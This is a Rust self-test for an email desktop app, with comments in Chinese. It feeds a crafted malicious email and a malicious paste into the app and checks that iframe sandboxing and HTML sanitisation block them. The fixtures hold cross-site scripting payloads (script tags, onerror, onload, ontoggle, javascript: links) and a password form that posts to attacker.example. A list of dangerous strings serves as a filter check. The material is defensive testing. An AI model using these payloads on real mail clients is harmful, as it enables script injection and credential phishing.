//! 自检：加载恶意来信和恶意粘贴内容，自动检查隔离与清洗是否生效。
//! 运行 `letterdesk-desktop --selftest`，结果以 JSON 输出到标准输出，全部通过时退出码为 0。

use crate::composer::{EDITOR_ID, js_string, read_editor_html, write_editor_html};
use crate::html::{clean_composer_html, html_to_text, text_to_html};
use dioxus::prelude::*;
use serde_json::{Value, json};

/// 在页面最早阶段注册消息监听：被隔离的来信里如果有脚本运行，
/// 唯一能联系父页面的途径是 postMessage，这里记录下来。
pub const HEAD_PROBE: &str = "<script>window.__ldMessages=[];window.addEventListener('message',function(e){window.__ldMessages.push(String(e.data))});</script>";

pub const MALICIOUS_EMAIL: &str = "From: \"IT Support\" <support@example.net>\r\n\
To: Lin Chen <lin@example.com>\r\n\
Subject: =?utf-8?q?Selftest=3A_malicious_HTML?=\r\n\
MIME-Version: 1.0\r\n\
Content-Type: text/html; charset=utf-8\r\n\
\r\n\
<h2>Quarterly update</h2>\r\n\
<p>Please review the attached numbers.</p>\r\n\
<script>parent.postMessage('script-ran','*');try{parent.__pwned='script'}catch(e){}try{window.ipc.postMessage('{}')}catch(e){}</script>\r\n\
<img src=\"x\" onerror=\"parent.postMessage('onerror-ran','*')\">\r\n\
<svg onload=\"parent.postMessage('svg-ran','*')\"></svg>\r\n\
<details open ontoggle=\"parent.postMessage('toggle-ran','*')\"><summary>details</summary></details>\r\n\
<a href=\"javascript:parent.postMessage('jslink-ran','*')\">Click me</a>\r\n\
<form action=\"https://attacker.example/\" method=\"post\"><input name=\"password\"><button>Sign in</button></form>\r\n\
<iframe src=\"https://attacker.example/\"></iframe>\r\n\
<table bgcolor=\"#eef\"><tr><td style=\"color:#a00\">Revenue up 12%</td></tr></table>\r\n";

const PASTED: &str = "<p>Hello <span style=\"color:red\" onclick=\"parent.__pwned='onclick'\">world</span></p><script>parent.__pwned='paste'</script><p><a href=\"javascript:alert(1)\">bad</a> <a href=\"https://example.com/\">ok</a></p>";

async fn eval_json(js: &str) -> Value {
    document::eval(js).await.unwrap_or(Value::Null)
}

pub async fn run() {
    let mut checks: Vec<(String, bool, Value)> = Vec::new();
    let mut check =
        |name: &str, ok: bool, detail: Value| checks.push((name.to_string(), ok, detail));

    // 1. 来信隔离：等两个 iframe 加载完。
    let isolation = eval_json(
        "await new Promise(r => setTimeout(r, 2000));
         const out = { messages: window.__ldMessages || null, pwned: window.__pwned === undefined ? null : String(window.__pwned), title: document.title, frames: {} };
         for (const id of ['ld-email-frame', 'ld-raw-frame']) {
           const f = document.getElementById(id);
           let readable = false;
           try { readable = !!(f.contentDocument && f.contentDocument.body); } catch (e) { readable = false; }
           out.frames[id] = { exists: !!f, sandbox: f ? f.getAttribute('sandbox') : null, parent_can_read: readable };
         }
         return out;",
    )
    .await;
    // 对照组的消息必须收到，来信 iframe 的消息一条都不能有。
    let only_control = isolation["messages"] == json!(["control-ran"]);
    check(
        "来信中的脚本和事件处理都没有运行（清洗后与未清洗两个 iframe；对照组脚本正常运行）",
        only_control,
        isolation["messages"].clone(),
    );
    check(
        "来信无法修改应用页面",
        isolation["pwned"].is_null(),
        isolation["pwned"].clone(),
    );
    for id in ["ld-email-frame", "ld-raw-frame"] {
        let f = &isolation["frames"][id];
        check(
            &format!("{id} 带空 sandbox 且来源不透明（应用页面也读不到它）"),
            f["exists"] == json!(true)
                && f["sandbox"] == json!("")
                && f["parent_can_read"] == json!(false),
            f.clone(),
        );
    }

    // 2. 写信框：粘贴恶意内容后执行格式命令，读回并清洗。
    let js = format!(
        "const el = document.getElementById({id});
         el.focus();
         el.innerHTML = {pasted};
         const text = el.querySelector('p').firstChild;
         const r = document.createRange(); r.setStart(text, 0); r.setEnd(text, 5);
         const s = window.getSelection(); s.removeAllRanges(); s.addRange(r);
         document.execCommand('bold');
         return el.innerHTML;",
        id = js_string(EDITOR_ID),
        pasted = js_string(PASTED)
    );
    let raw = eval_json(&js)
        .await
        .as_str()
        .unwrap_or_default()
        .to_string();
    let clean = clean_composer_html(&raw);
    let bolded = clean.contains("<b>Hello</b>") || clean.contains("<strong>Hello</strong>");
    check("格式命令（粗体）作用于选区", bolded, json!(raw));
    let dangerous = ["<script", "onclick", "style=", "javascript:", "__pwned"];
    check(
        "清洗后不含脚本、事件属性、样式和 javascript: 链接",
        !dangerous.iter().any(|d| clean.contains(d)),
        json!(clean),
    );
    check(
        "清洗后保留普通链接",
        clean.contains("href=\"https://example.com/\""),
        json!(clean),
    );
    let plain = html_to_text(&clean);
    check(
        "纯文本部分正确",
        plain == "Hello world\n\nbad ok <https://example.com/>",
        json!(plain),
    );

    // 3. 填入 AI 草稿后读回，纯文本与原文一致。
    let draft = "Hi Maya,\n\nThursday works.\nSee you then.\n\nBest,";
    write_editor_html(&text_to_html(draft));
    let back = read_editor_html().await.unwrap_or_default();
    let back_text = html_to_text(&clean_composer_html(&back));
    check(
        "填入的草稿读回后与原文一致",
        back_text == draft,
        json!(back_text),
    );

    let passed = checks.iter().all(|(_, ok, _)| *ok);
    let report = json!({
        "passed": passed,
        "checks": checks.iter().map(|(name, ok, detail)| json!({"name": name, "ok": ok, "detail": detail})).collect::<Vec<_>>(),
    });
    println!("{}", serde_json::to_string_pretty(&report).unwrap());
    std::process::exit(if passed { 0 } else { 1 });
}
